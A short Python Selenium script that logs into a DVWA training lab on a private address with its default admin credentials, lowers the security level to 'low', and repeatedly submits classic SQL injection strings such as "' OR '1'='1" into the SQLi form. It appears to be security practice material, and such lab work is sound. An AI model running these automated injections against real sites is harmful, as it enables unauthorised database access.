from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def login(driver, login_addr, usrname, pswrd):
    driver.get(login_addr)
    assert "Login" in driver.title

    username_inp = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "username"))
    )
    passw_inp = driver.find_element(By.NAME, "password")

    username_inp.clear()
    passw_inp.clear()

    username_inp.send_keys(usrname)
    passw_inp.send_keys(pswrd)
    passw_inp.send_keys(Keys.RETURN)


def set_security_lvl(driver, security_lvl_addr, security_lvl):
    driver.get(security_lvl_addr)
    security_lvls = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "security"))
    )
    all_options = security_lvls.find_elements(By.TAG_NAME, "option")
    for option in all_options:
        if option.get_attribute("value") == security_lvl:
            option.click()
            break
    driver.find_element(By.NAME, "seclev_submit").click()


def send_exploit(driver, sqli_addr, exploit_str):
    driver.get(sqli_addr)
    user_id = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "id"))
    )
    user_id.clear()
    user_id.send_keys(exploit_str)
    user_id.send_keys(Keys.RETURN)


if __name__ == "__main__":
    LOGIN_ADDR = "http://192.168.21.3/dvwa/login.php"
    SQLI_ADDR = "http://192.168.21.3/dvwa/vulnerabilities/sqli/"
    SECURITY_LVL_ADDR = "http://192.168.21.3/dvwa/security.php"
    EXPLOIT_STRS = ["%' or '1'='1", "' OR '1'='1"]

    driver = webdriver.Firefox()

    try:
        login(driver, LOGIN_ADDR, "admin", "password")
        set_security_lvl(driver, SECURITY_LVL_ADDR, "low")
        print("Ctrl + C to stop injection")
        while True:
            for exploit_str in EXPLOIT_STRS:
                send_exploit(driver, SQLI_ADDR, exploit_str)
    except KeyboardInterrupt:
        print("Stopping attack.")
    finally:
        driver.quit()
